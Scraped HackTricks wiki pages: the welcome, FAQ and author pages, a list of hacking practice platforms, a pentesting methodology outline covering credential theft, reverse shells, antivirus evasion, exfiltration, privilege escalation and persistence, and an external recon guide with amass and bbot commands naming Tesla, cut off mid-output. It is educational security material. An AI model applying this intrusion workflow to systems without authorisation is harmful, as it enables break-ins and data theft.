[
    {
        "title": "HackTricks",
        "url": "https://book.hacktricks.xyz/welcome/readme",
        "text": "HackTricks\nHacktricks logos & motion design by\n@ppiernacho\n.\nWelcome to the wiki where you will find each hacking trick/technique/whatever I have learnt from CTFs, real life apps, reading researches, and news.\nTo get started follow this page where you will find the\ntypical flow\nthat\nyou should follow when pentesting\none or more\nmachines:\nPentesting Methodology\nPlatinum Sponsors\nYour company could be here.\nCorporate Sponsors\n‚Äã\nSTM Cyber\n‚Äã\n‚Äã\nSTM Cyber\nis a great cybersecurity company whose slogan is\nHACK THE UNHACKABLE\n. They perform their own research and develop their own hacking tools to\noffer several valuable cybersecurity services\nlike pentesting, Red teams and training.\nYou can check their\nblog\nin\nhttps://blog.stmcyber.com\n‚Äã\nSTM Cyber\nalso support cybersecurity open source projects like HackTricks :)\n‚Äã\nRootedCON\n‚Äã\n‚Äã\nRootedCON\nis the most relevant cybersecurity event in\nSpain\nand one of the most important in\nEurope\n. With\nthe mission of promoting technical knowledge\n, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.\nRootedCON\nRootedCON\n‚Äã\nIntigriti\n‚Äã\nIntigriti\nis the\nEurope's #1\nethical hacking and\nbug bounty platform.\nBug bounty tip\n:\nsign up\nfor\nIntigriti\n, a premium\nbug bounty platform created by hackers, for hackers\n! Join us at\nhttps://go.intigriti.com/hacktricks\ntoday, and start earning bounties up to\n$100,000\n!\nRegister - Intigriti\nRegister - Intigriti\n‚Äã\nTrickest\n‚Äã\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\n‚Äã\nIntruder\n‚Äã\nStay a step ahead in the cybersecurity game.\n‚Äã\nIntruder\nmakes vulnerability management easy. Keep track of your attack surface, see where your company is vulnerable, and prioritize issues that leave your systems most exposed so you can focus on what matters most.\nRun thousands of checks with a single platform that covers your entire tech stack from internal infrastructure to web apps, APIs and cloud systems. Integrate seamlessly with\nAWS, GCP, Azure\nand streamline DevOps so your team can implement fixes faster.\nIntruder never rests. Round-the-clock protection monitors your systems 24/7. Want to learn more? Visit their site and take it for a spin with\na free trial\n.\nIntruder | An Effortless Vulnerability Scanner\n‚Äã\nHACKENPROOF\n‚Äã\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\n‚Äã\nWebSec\n‚Äã\n‚Äã\nWebSec\nis a professional cybersecurity company based in\nAmsterdam\nwhich helps\nprotecting\nbusinesses\nall over the world\nagainst the latest cybersecurity threats by providing\noffensive-security services\nwith a\nmodern\napproach.\nWebSec is an\nall-in-one security company\nwhich means they do it all; Pentesting,\nSecurity\nAudits, Awareness Trainings, Phishing Campagnes, Code Review, Exploit Development, Security Experts Outsourcing and much more.\nAnother cool thing about WebSec is that unlike the industry average WebSec is\nvery confident in their skills\n, to such an extent that they\nguarantee the best quality results\n, it states on their website \"\nIf we can't hack it, You don't pay it!\n\". For more info take a look at their\nwebsite\nand\nblog\n!\nIn addition to the above WebSec is also a\ncommitted supporter of HackTricks.\n‚Äã\nDragonJAR\n‚Äã\n‚Äã\nDragonJAR is a leading offensive cybersecurity company\nlocated in Colombia\n. DragonJAR offers\ncomprehensive offensive cybersecurity services, such as\npentesting\nin various areas and practically\nany technology\n,\nRed Team\nattack simulations,\nphysical\nsecurity testing,\nstress testing\n, social engineering, source\ncode security review\n, and cybersecurity training. Additionally, they organize the\nDragonJAR Security Conference\n,\nan international cybersecurity congress\nthat has been held for over a decade, becoming a showcase for the latest security research in Spanish and of great relevance in the region.\n‚Äã\nDragonJAR es una empresa l√≠der en ciberseguridad ofensiva\nubicada en Colombia\n, DragonJAR ofrece\nservicios integrales de seguridad inform√°tica ofensiva, como\npentesting\nen diversas √°reas y pr√°cticamente\ncualquier tecnolog√≠a\n, simulaciones de ataque\nRed Team\n, pruebas de seguridad\nf√≠sica\n,\npruebas de estr√©s\n, ingenier√≠a social, revisi√≥n de seguridad en\nc√≥digo fuente\ny capacitaci√≥n en seguridad inform√°tica. Asimismo, organiza la\nDragonJAR Security Conference\n,\nun congreso internacional de seguridad inform√°tica\nque se ha realizado durante m√°s de una d√©cada, convirti√©ndose en el escaparate para las √∫ltimas investigaciones de seguridad en espa√±ol y de gran relevancia en la regi√≥n.\nLicense\nCopyright ¬© Carlos Polop 2023. Except where otherwise specified (the external information copied into the book belongs to the original authors), the text on\nHACK TRICKS\nby Carlos Polop is licensed under the\nAttribution-NonCommercial 4.0 International (CC BY-NC 4.0)\n.\nIf you want to use it with commercial purposes, contact me.\nDisclaimer\nThis book, 'HackTricks,' is intended for educational and informational purposes only. The content within this book is provided on an 'as is' basis, and the authors and publishers make no representations or warranties of any kind, express or implied, about the completeness, accuracy, reliability, suitability, or availability of the information, products, services, or related graphics contained within this book. Any reliance you place on such information is therefore strictly at your own risk.\nThe authors and publishers shall in no event be liable for any loss or damage, including without limitation, indirect or consequential loss or damage, or any loss or damage whatsoever arising from loss of data or profits arising out of, or in connection with, the use of this book.\nFurthermore, the techniques and tips described in this book are provided for educational and informational purposes only, and should not be used for any illegal or malicious activities. The authors and publishers do not condone or support any illegal or unethical activities, and any use of the information contained within this book is at the user's own risk and discretion.\nThe user is solely responsible for any actions taken based on the information contained within this book, and should always seek professional advice and assistance when attempting to implement any of the techniques or tips described herein.\nBy using this book, the user agrees to release the authors and publishers from any and all liability and responsibility for any damages, losses, or harm that may result from the use of this book or any of the information contained within it.\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNext\n- Welcome!\nHackTricks Values & faq\nLast modified\n2mo ago"
    },
    {
        "title": "HackTricks Values & faq",
        "url": "https://book.hacktricks.xyz/welcome/hacktricks-values-and-faq",
        "text": "HackTricks Values & faq\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nHackTricks Values\nThese are the\nvalues of the HackTricks Project\n:\nGive\nFREE\naccess to\nEDUCATIONAL hacking\nresources to\nALL\nInternet.\nHacking is about learning, and learning should be as free as possible.\nThe purpose of this book is to serve as a comprehensive\neducational resource\n.\nSTORE\nawesome\nhacking\ntechniques that the community publishes giving the\nORIGINAL\nAUTHORS\nall the\ncredits\n.\nWe don't want the credit from other people\n, we just want to store cool tricks for everyone.\nWe also write\nour own researches\nin HackTricks.\nIn several cases we will just write\nin HackTricks a summary of the important parts\nof the technique and will\nencourage the lector to visit the original post\nfor more details.\nORGANIZE\nall the hacking techniques in the book so it's\nMORE ACCESSIBLE\nThe HackTricks team has dedicated thousands of hours for free\nonly to organize the content\nso people can\nlearn faster\nHackTricks faq\nThank you so much for these resources, how can I thank you?\nYou can publicly thanks HackTricks teams for putting together all these resources publicly in a tweet mentioning\n@hacktricks_live\n.\nIf you are specially grateful you can also\nsponsor the project here\n.\nAnd don't forget to\ngive a star in the Github projects!\n(Find the links below).\nHow can I contribute to the project?\nYou can\nshare new tips and tricks with the community or fix bugs\nyou find in the books sending a\nPull Request\nto the respective Github pages:\n‚Äã\nhttps://github.com/carlospolop/hacktricks\n‚Äã\n‚Äã\nhttps://github.com/carlospolop/hacktricks-cloud\n‚Äã\nDon't forget to\ngive a star in the Github projects!\nCan I copy some content from HackTricks and put it in my blog?\nYes, you can, but\ndon't forget to mention the specific link(s)\nwhere the content was taken from.\nCan I copy all HackTricks in my blog?\nI would rather not\n. Thats\nnot going to benefit anyone\nas all the\ncontent is already publicly available\nin the official HackTricks books for free.\nIf you fear that it will disappear, just fork it in Github or download it, as I said it's already free.\nWhy do you have sponsors? Are HackTricks books for commercial purposes?\nThe first\nHackTricks\nvalue\nis to offer\nFREE\nhacking educational resources to\nALL\nthe world. The HackTricks team has\ndedicated thousands of hours\nto offer this content, again, for\nFREE\n.\nIf you think HackTricks books are made for\ncommercial purposes\nyou are\nCOMPLETELY WRONG\n.\nWe have sponsors because, even if all the content is FREE, we want to\noffer the community the possibility of appreciating our work\nif they want to. Therefore, we offer people the option to donate to HackTricks via\nGithub sponsors\n, and\nrelevant cybersecurity companies\nto sponsor HackTricks and to\nhave some ads\nin the book being the\nads\nalways placed in places where make them\nvisible\nbut\ndoesn't disturb the learning\nprocess if someone focus in the content.\nYou won't find HackTricks filled with annoying ads like other blogs with much less content than HackTricks, because HackTricks is not made for commercial purposes.\nWhat should I do if some HackTricks page is based on my blog post but it isn't referenced?\nWe are very sorry. This shouldn't have happened\n. Please, let us know via Github issues, Twitter, Discord... the link of the HackTricks page with the content and the link of your blog and\nwe will check it and add it ASAP\n.\nWhat should I do if there is content from my blog in HackTricks and I don't want it there?\nIn any case know that HackTricks in this case would be improving your\nSEO\nand\nencouraging\npeople to\ncheck your page\n. If you still want the content of your blog to be removed from HackTricks let us know.\nNote that asking this we will definitely\nremove every link to your blog\n, but if the same technique can be found in other web pages we will just change the source of the information and the explanation, so the real content won't probably leave HackTricks (in cybersecurity, in general, there are always several post talking about the same technique).\nLicense\nCopyright ¬© Carlos Polop 2023. Except where otherwise specified (the external information copied into the book belongs to the original authors), the text on\nHACK TRICKS\nby Carlos Polop is licensed under the\nAttribution-NonCommercial 4.0 International (CC BY-NC 4.0)\n.\nIf you want to use it with commercial purposes, contact me.\nDisclaimer\nThis book, 'HackTricks,' is intended for educational and informational purposes only. The content within this book is provided on an 'as is' basis, and the authors and publishers make no representations or warranties of any kind, express or implied, about the completeness, accuracy, reliability, suitability, or availability of the information, products, services, or related graphics contained within this book. Any reliance you place on such information is therefore strictly at your own risk.\nThe authors and publishers shall in no event be liable for any loss or damage, including without limitation, indirect or consequential loss or damage, or any loss or damage whatsoever arising from loss of data or profits arising out of, or in connection with, the use of this book.\nFurthermore, the techniques and tips described in this book are provided for educational and informational purposes only, and should not be used for any illegal or malicious activities. The authors and publishers do not condone or support any illegal or unethical activities, and any use of the information contained within this book is at the user's own risk and discretion.\nThe user is solely responsible for any actions taken based on the information contained within this book, and should always seek professional advice and assistance when attempting to implement any of the techniques or tips described herein.\nBy using this book, the user agrees to release the authors and publishers from any and all liability and responsibility for any damages, losses, or harm that may result from the use of this book or any of the information contained within it.\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nWelcome! -\nPrevious\nHackTricks\nNext\n- Welcome!\nAbout the author\nLast modified\n20d ago"
    },
    {
        "title": "About the author",
        "url": "https://book.hacktricks.xyz/welcome/about-the-author",
        "text": "About the author\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nHello!!\nThis is\nCarlos Polop\n.\nFirst of all, I want to indicate that\nI don't own this entire book\n, a lot of\ninformation was copy/pasted from other websites and that content belongs to them\n(this is indicated on the pages).\nI also want to say\nthanks to all the people that share cyber-security related information for free\non the Internet. Thanks to them I learn new hacking techniques that then I add to Hacktricks.\nMoreover, I also\nwrite the results of my own researches\nhere in HackTricks.\nTherefore, I expect that in\nHackTricks\nyou will find\nall\nthe\nsecurity tricks\navailable on the internet about a\ntopic\n+ potentially something\nextra\n. If you find something is\nmissing\n, please, send a\nPull Request\nto Hacktricks Github!\nBIO\nJust check my\nlinkedin\n:\nhttps://www.linkedin.com/in/carlos-polop-martin/\n‚Äã\nIf you find that HackTricks is very useful for you, please consider\nsupporting it!\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nWelcome! -\nPrevious\nHackTricks Values & faq\nNext\n- Welcome!\nGetting Started in Hacking\nLast modified\n6mo ago"
    },
    {
        "title": "Getting Started in Hacking",
        "url": "https://book.hacktricks.xyz/welcome/getting-started-in-hacking",
        "text": "Getting Started in Hacking\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nLearning by Practice\n‚Äã\nhttps://www.hackthebox.eu/\n&\nhttps://academy.hackthebox.eu/catalogue\n‚Äã\nHackthebox has online machines to hack, it's the best place to learn by practicing. If you are new I would recommend you learning by doing retired machines following Ippsec videos.\nHackTheBox academy is the new platform to learn hacking in a more guided way, also a great resource if you want to practice hacking some specific technology!\n‚Äã\nhttps://tryhackme.com/\n‚Äã\nTryhackme is a platform with virtual machines that need to be solved through walkthroughs, which is very good for beginners and normal CTFs where you self must hack into the machines.\n‚Äã\nhttps://www.root-me.org/\n‚Äã\nRootme is another page for online hosted virtual machines to hack.\n‚Äã\nhttps://www.vulnhub.com/\n‚Äã\nVulnhub has machines to download and then to hack\n‚Äã\nhttps://hack.me/\n‚Äã\nThis site seems to be a community platform\n‚Äã\nhttps://www.hacker101.com/\n‚Äã\nfree site with videos and CTFs\n‚Äã\nhttps://crackmes.one/\n‚Äã\nThis site has a lot of binaries for forensic learning.\n‚Äã\nhttps://www.hackthissite.org/missions/basic/\n‚Äã\n‚Äã\nhttps://attackdefense.com/\n‚Äã\n‚Äã\nhttps://portswigger.net/web-security/dashboard\n‚Äã\nThis website has a lot of web exploitation labs\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nWelcome! -\nPrevious\nAbout the author\nNext\n- Generic Methodologies & Resources\nPentesting Methodology\nLast modified\n6mo ago"
    },
    {
        "title": "Pentesting Methodology",
        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-methodology",
        "text": "Pentesting Methodology\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBug bounty tip\n:\nsign up\nfor\nIntigriti\n, a premium\nbug bounty platform created by hackers, for hackers\n! Join us at\nhttps://go.intigriti.com/hacktricks\ntoday, and start earning bounties up to\n$100,000\n!\nRegister - Intigriti\nRegister - Intigriti\nPentesting Methodology\nHacktricks logos designed by\n@ppiernacho\n.\n0- Physical Attacks\nDo you have\nphysical access\nto the machine that you want to attack? You should read some\ntricks about physical attacks\nand others about\nescaping from GUI applications\n.\n1 -\nDiscovering hosts inside the network\n/\nDiscovering Assets of the company\n‚Äã\nDepending\nif the\ntest\nyou are perform is an\ninternal or external test\nyou may be interested on finding\nhosts inside the company network\n(internal test) or\nfinding assets of the company on the internet\n(external test).\nNote that if you are performing an external test, once you manage to obtain access to the internal network of the company you should re-start this guide.\n2-\nHaving Fun with the network\n(Internal)\nThis section only applies if you are performing an internal test.\nBefore attacking a host maybe you prefer to\nsteal some credentials\nfrom the network\nor\nsniff\nsome\ndata\nto learn\npassively/actively(MitM)\nwhat can you find inside the network. You can read\nPentesting Network\n.\n3-\nPort Scan - Service discovery\n‚Äã\nThe first thing to do when\nlooking for vulnerabilities in a host\nis to know which\nservices are running\nin which ports. Let's see the\nbasic tools to scan ports of hosts\n.\n4-\nSearching service version exploits\n‚Äã\nOnce you know which services are running, and maybe their version, you have to\nsearch for known vulnerabilities\n. Maybe you get lucky and there is a exploit to give you a shell...\n5-\nPentesting Services\nIf there isn't any fancy exploit for any running service, you should look for\ncommon misconfigurations in each service running.\nInside this book you will find a guide to pentest the most common services\n(and others that aren't so common)\n. Please, search in the left index the\nPENTESTING\nsection\n(the services are ordered by their default ports).\nI want to make a special mention of the\nPentesting Web\npart (as it is the most extensive one).\nAlso, a small guide on how to\nfind known vulnerabilities in software\ncan be found here.\nIf your service is not inside the index, search in Google\nfor other tutorials and\nlet me know if you want me to add it.\nIf you\ncan't find anything\nin Google, perform your\nown blind pentesting\n, you could start by\nconnecting to the service, fuzzing it and reading the responses\n(if any).\n5.1 Automatic Tools\nThere are also several tools that can perform\nautomatic vulnerabilities assessments\n.\nI would recommend you to try\nLegion\n, which is the tool that I have created and it's based on the notes about pentesting services that you can find in this book.\n5.2 Brute-Forcing services\nIn some scenarios a\nBrute-Force\ncould be useful to\ncompromise\na\nservice\n.\nFind here a CheatSheet of different services brute forcing\n.\n‚Äã\nBug bounty tip\n:\nsign up\nfor\nIntigriti\n, a premium\nbug bounty platform created by hackers, for hackers\n! Join us at\nhttps://go.intigriti.com/hacktricks\ntoday, and start earning bounties up to\n$100,000\n!\\\nRegister - Intigriti\nRegister - Intigriti\n6-\nPhishing\n‚Äã\nIf at this point you haven't found any interesting vulnerability you\nmay need to try some phishing\nin order to get inside the network. You can read my phishing methodology\nhere\n:\n7-\nGetting Shell\n‚Äã\nSomehow you should have found\nsome way to execute code\nin the victim. Then,\na list of possible tools inside the system that you can use to get a reverse shell would be very useful\n.\nSpecially in Windows you could need some help to\navoid antiviruses\n:\nCheck this page\n.\n\\\n8- Inside\nIf you have troubles with the shell, you can find here a small\ncompilation of the most useful commands\nfor pentesters:\n‚Äã\nLinux\n‚Äã\n‚Äã\nWindows (CMD)\n‚Äã\n‚Äã\nWinodows (PS)\n‚Äã\n9 -\nExfiltration\n‚Äã\nYou will probably need to\nextract some data from the victim\nor even\nintroduce something\n(like privilege escalation scripts).\nHere you have a\npost about common tools that you can use with these purposes\n.\n10- Privilege Escalation\n10.1- Local Privesc\nIf you are\nnot root/Administrator\ninside the box, you should find a way to\nescalate privileges.\nHere you can find a\nguide to escalate privileges locally in\nLinux\nand in\nWindows\n.\nYou should also check this pages about how does\nWindows work\n:\n‚Äã\nAuthentication, Credentials, Token privileges and UAC\n‚Äã\nHow does\nNTLM works\n‚Äã\nHow to\nsteal credentials\nin Windows\nSome tricks about\nActive Directory\n‚Äã\nDon't forget to checkout the best tools to enumerate Windows and Linux local Privilege Escalation paths:\nSuite PEAS\n‚Äã\n10.2- Domain Privesc\nHere you can find a\nmethodology explaining the most common actions to enumerate, escalate privileges and persist on an Active Directory\n. Even if this is just a subsection of a section, this process could be\nextremely delicate\non a Pentesting/Red Team assignment.\n11 - POST\n11\n.1 - Looting\nCheck if you can find more\npasswords\ninside the host or if you have\naccess to other machines\nwith the\nprivileges\nof your\nuser\n.\nFind here different ways to\ndump passwords in Windows\n.\n11.2 - Persistence\nUse 2 o 3 different types of persistence mechanism so you won't need to exploit the system again.\nHere you can find some\npersistence tricks on active directory\n.\nTODO: Complete persistence Post in Windows & Linux\n12 - Pivoting\nWith the\ngathered credentials\nyou could have access to other machines, or maybe you need to\ndiscover and scan new hosts\n(start the Pentesting Methodology again) inside new networks where your victim is connected.\nIn this case tunnelling could be necessary. Here you can find\na post talking about tunnelling\n.\nYou definitely should also check the post about\nActive Directory pentesting Methodology\n. There you will find cool tricks to move laterally, escalate privileges and dump credentials.\nCheck also the page about\nNTLM\n, it could be very useful to pivot on Windows environments..\nMORE\n‚Äã\nAndroid Applications\n‚Äã\nExploiting\n‚Äã\nBasic Linux Exploiting\n‚Äã\n‚Äã\nBasic Windows Exploiting\n‚Äã\n‚Äã\nBasic exploiting tools\n‚Äã\n‚Äã\nBasic Python\n‚Äã\nCrypto tricks\n‚Äã\nECB\n‚Äã\n‚Äã\nCBC-MAC\n‚Äã\n‚Äã\nPadding Oracle\n‚Äã\n‚Äã\nBug bounty tip\n:\nsign up\nfor\nIntigriti\n, a premium\nbug bounty platform created by hackers, for hackers\n! Join us at\nhttps://go.intigriti.com/hacktricks\ntoday, and start earning bounties up to\n$100,000\n!\nRegister - Intigriti\nRegister - Intigriti\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nWelcome! -\nPrevious\nGetting Started in Hacking\nNext\n- Generic Methodologies & Resources\nExternal Recon Methodology\nLast modified\n4mo ago"
    },
    {
        "title": "External Recon Methodology",
        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology",
        "text": "External Recon Methodology\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\n‚Äã\nBug bounty tip\n:\nsign up\nfor\nIntigriti\n, a premium\nbug bounty platform created by hackers, for hackers\n! Join us at\nhttps://go.intigriti.com/hacktricks\ntoday, and start earning bounties up to\n$100,000\n!\nRegister - Intigriti\nRegister - Intigriti\nAssets discoveries\nSo you were said that everything belonging to some company is inside the scope, and you want to figure out what this company actually owns.\nThe goal of this phase is to obtain all the\ncompanies owned by the main company\nand then all the\nassets\nof these companies. To do so, we are going to:\n1.\nFind the acquisitions of the main company, this will give us the companies inside the scope.\n2.\nFind the ASN (if any) of each company, this will give us the IP ranges owned by each company\n3.\nUse reverse whois lookups to search for other entries (organisation names, domains...) related to the first one (this can be done recursively)\n4.\nUse other techniques like shodan\norg\nand\nssl\nfilters to search for other assets (the\nssl\ntrick can be done recursively).\nAcquisitions\nFirst of all, we need to know which\nother companies are owned by the main company\n.\nOne option is to visit\nhttps://www.crunchbase.com/\n,\nsearch\nfor the\nmain company\n, and\nclick\non \"\nacquisitions\n\". There you will see other companies acquired by the main one.\nOther option is to visit the\nWikipedia\npage of the main company and search for\nacquisitions\n.\nOk, at this point you should know all the companies inside the scope. Lets figure out how to find their assets.\nASNs\nAn autonomous system number (\nASN\n) is a\nunique number\nassigned to an\nautonomous system\n(AS) by the\nInternet Assigned Numbers Authority (IANA)\n.\nAn\nAS\nconsists of\nblocks\nof\nIP addresses\nwhich have a distinctly defined policy for accessing external networks and are administered by a single organisation but may be made up of several operators.\nIt's interesting to find if the\ncompany have assigned any ASN\nto find its\nIP ranges.\nIt will be interested to perform a\nvulnerability test\nagainst all the\nhosts\ninside the\nscope\nand\nlook for domains\ninside these IPs.\nYou can\nsearch\nby company\nname\n, by\nIP\nor by\ndomain\nin\nhttps://bgp.he.net/\n.\nDepending on the region of the company this links could be useful to gather more data:\nAFRINIC\n(Africa),\nArin\n(North America),\nAPNIC\n(Asia),\nLACNIC\n(Latin America),\nRIPE NCC\n(Europe). Anyway, probably all the\nuseful information\n(IP ranges and Whois)\nappears already in the first link.\n#You can try \"automate\" this with amass, but it's not very recommended\namass intel\n-org\ntesla\namass intel\n-asn\n8911,50313\n,394161\nAlso,\nBBOT\n's\nsubdomain enumeration automatically aggregates and summarizes ASNs at the end of the scan.\nbbot\n-t\ntesla.com\n-f\nsubdomain-enum\n..\n.\n[\nINFO\n]\nbbot.modules.asn: +----------+---------------------+--------------+----------------+----------------------------+-----------+\n[\nINFO\n]\nbbot.modules.asn:\n|\nAS394161\n|\n8.244\n.131.0/24\n|\n5\n|\nTESLA\n|\nTesla Motors, Inc.\n|\nUS\n|\n[\nINFO\n]\nbbot.modules.asn: +----------+---------------------+--------------+----------------+----------------------------+-----------+\n[\nINFO\n]\nbbot.modules.asn:\n|\nAS16509\n|\n54.148\n.0.0/15\n|\n4\n|\nAMAZON-02\n|\nAmazon.com, Inc.\n|\nUS\n|\n[\nINFO\n]\nbbot.modules.asn: 